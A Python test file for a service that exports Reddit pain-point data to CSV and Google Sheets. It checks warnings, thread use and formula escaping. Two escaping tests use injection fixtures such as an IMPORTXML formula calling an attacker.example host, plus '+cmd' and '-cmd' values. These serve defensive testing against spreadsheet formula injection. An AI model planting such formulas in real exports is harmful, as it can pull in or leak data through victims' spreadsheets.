import csv
import re
from unittest.mock import AsyncMock, MagicMock, patch

from export_sheets import ExportService


async def test_export_service_writes_csv_and_returns_warning_when_sheets_fails(tmp_path):
    db = AsyncMock()
    db.list_export_rows.return_value = [
        {
            "created_at": "2026-02-24T00:00:00",
            "subreddit": "python",
            "post_id": "abc",
            "title": "Need better sync",
            "summary": "Summary",
            "pain_level": 8,
            "willingness_to_pay": 9,
            "niche_category": "DevOps",
            "category": "complaint",
            "severity": "high",
            "triage_status": "new",
            "deep_dive_status": "not_requested",
            "deep_dive_summary": "",
            "url": "https://reddit.com/abc",
        }
    ]

    service = ExportService(
        db=db,
        reports_dir=str(tmp_path),
        min_wtp=8,
        sheets_credentials_json="{\"invalid\": true}",
        sheets_spreadsheet_id="sheet-id",
    )

    result = await service.export(subreddit="python")

    assert result.row_count == 1
    assert result.csv_path.endswith(".csv")
    assert re.search(r"export_python_\d{8}_\d{6}_\d{6}\.csv$", result.csv_path)
    assert result.warning is not None
    assert result.sheet_url is None


async def test_export_service_works_without_sheets_config(tmp_path):
    db = AsyncMock()
    db.list_export_rows.return_value = []

    service = ExportService(
        db=db,
        reports_dir=str(tmp_path),
        min_wtp=8,
    )

    result = await service.export(subreddit=None)
    assert result.row_count == 0
    assert result.warning is None
    assert result.sheet_url is None


async def test_export_service_escapes_spreadsheet_formulas_in_csv(tmp_path):
    db = AsyncMock()
    db.list_export_rows.return_value = [
        {
            "created_at": "2026-02-24T00:00:00",
            "subreddit": "python",
            "source": "reddit",
            "post_id": "abc",
            "title": "=IMPORTXML(\"https://attacker.example\")",
            "summary": "  @SUM(1,1)",
            "pain_level": 8,
            "willingness_to_pay": 9,
            "niche_category": "+Finance",
            "competitor_tags": "[]",
            "category": "complaint",
            "severity": "high",
            "triage_status": "new",
            "deep_dive_status": "not_requested",
            "deep_dive_summary": "-cmd",
            "url": "https://reddit.com/abc",
        }
    ]
    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)

    result = await service.export()

    with open(result.csv_path, newline="", encoding="utf-8") as handle:
        row = next(csv.DictReader(handle))
    assert row["title"].startswith("'=")
    assert row["summary"].startswith("'  @")
    assert row["niche_category"].startswith("'+")
    assert row["deep_dive_summary"].startswith("'-")


async def test_export_service_returns_sheet_url_on_success(tmp_path):
    """Happy path: _upsert_google_sheet runs in asyncio.to_thread and returns URL."""
    db = AsyncMock()
    db.list_export_rows.return_value = [
        {
            "created_at": "2026-02-24T00:00:00",
            "subreddit": "python",
            "post_id": "xyz",
            "title": "Pain point title",
            "summary": "Some summary",
            "pain_level": 9,
            "willingness_to_pay": 10,
            "niche_category": "SaaS",
            "source": "reddit",
            "competitor_tags": "[]",
            "category": "complaint",
            "severity": "high",
            "triage_status": "new",
            "deep_dive_status": "not_requested",
            "deep_dive_summary": "",
            "url": "https://reddit.com/xyz",
        }
    ]

    expected_url = "https://docs.google.com/spreadsheets/d/sheet-id-123"

    service = ExportService(
        db=db,
        reports_dir=str(tmp_path),
        min_wtp=8,
        sheets_credentials_json='{"type": "service_account"}',
        sheets_spreadsheet_id="sheet-id-123",
    )

    # Patch asyncio.to_thread so _upsert_google_sheet is never actually invoked,
    # and verify the awaitable path is used (non-blocking).
    with patch("export_sheets.asyncio.to_thread", new_callable=AsyncMock) as mock_to_thread:
        mock_to_thread.return_value = expected_url
        result = await service.export(subreddit="python")

    assert result.sheet_url == expected_url
    assert result.warning is None
    assert result.row_count == 1
    # Confirm to_thread was called with the sync method (not a direct call)
    mock_to_thread.assert_called_once()
    call_args = mock_to_thread.call_args
    assert call_args.args[0] == service._upsert_google_sheet


async def test_upsert_google_sheet_is_sync_method(tmp_path):
    """_upsert_google_sheet must remain a regular (non-async) method."""
    import asyncio as _asyncio

    db = MagicMock()
    service = ExportService(
        db=db,
        reports_dir=str(tmp_path),
        min_wtp=8,
    )
    assert not _asyncio.iscoroutinefunction(service._upsert_google_sheet), (
        "_upsert_google_sheet must stay synchronous"
    )


def test_upsert_google_sheet_escapes_spreadsheet_formulas(tmp_path):
    db = MagicMock()
    service = ExportService(
        db=db,
        reports_dir=str(tmp_path),
        min_wtp=8,
        sheets_credentials_json='{"type": "service_account"}',
        sheets_spreadsheet_id="sheet-id",
    )
    worksheet = MagicMock()
    spreadsheet = MagicMock()
    spreadsheet.worksheet.return_value = worksheet
    client = MagicMock()
    client.open_by_key.return_value = spreadsheet
    fake_gspread = MagicMock()
    fake_gspread.WorksheetNotFound = RuntimeError
    fake_gspread.service_account_from_dict.return_value = client

    with patch("export_sheets.gspread", fake_gspread):
        service._upsert_google_sheet(
            rows=[
                {
                    "created_at": "2026-02-24T00:00:00",
                    "subreddit": "python",
                    "source": "reddit",
                    "post_id": "abc",
                    "title": "=IMPORTXML(\"https://attacker.example\")",
                    "summary": "@SUM(1,1)",
                    "pain_level": 8,
                    "willingness_to_pay": 9,
                    "niche_category": "-Finance",
                    "competitor_tags": "[]",
                    "category": "complaint",
                    "severity": "high",
                    "triage_status": "new",
                    "deep_dive_status": "not_requested",
                    "deep_dive_summary": "+cmd",
                    "url": "https://reddit.com/abc",
                }
            ],
            headers=[
                "created_at",
                "subreddit",
                "source",
                "post_id",
                "title",
                "summary",
                "pain_level",
                "willingness_to_pay",
                "niche_category",
                "competitor_tags",
                "category",
                "severity",
                "triage_status",
                "deep_dive_status",
                "deep_dive_summary",
                "url",
            ],
            subreddit=None,
        )

    values = worksheet.update.call_args.args[1]
    data_row = values[1]
    assert data_row[4].startswith("'=")
    assert data_row[5].startswith("'@")
    assert data_row[8].startswith("'-")
    assert data_row[14].startswith("'+")
